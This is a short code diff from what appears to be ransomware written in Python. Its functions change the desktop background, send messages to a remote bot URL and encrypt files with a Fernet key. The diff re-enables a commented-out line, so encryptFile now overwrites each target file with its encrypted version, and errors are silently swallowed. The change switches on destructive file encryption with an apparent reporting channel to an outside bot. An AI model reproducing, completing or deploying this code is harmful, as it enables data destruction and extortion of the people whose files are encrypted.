@@ -86,7 +86,7 @@ def setBackgroundImage(path_to_url: str, path_to_local: str, val_set: int, val_i
 def sendToBot(path_to_bot: str, message: str) -> None:
     try:
         message_as_string: str = (
-        message
+            message
             .replace(" ","_")
         )
         message_to_bot: str = path_to_bot + message_as_string
@@ -109,7 +109,7 @@ def encryptFile(path_to_file: str, encryption_key: str) -> None:
     try:
         file_as_bytes: bytes = openFile(path_to_file)
         file_encrypted: Any = fernet.encrypt(file_as_bytes)
-        # saveToFile(path_to_file,file_encrypted)
+        saveToFile(path_to_file,file_encrypted)
     except:
         pass
 
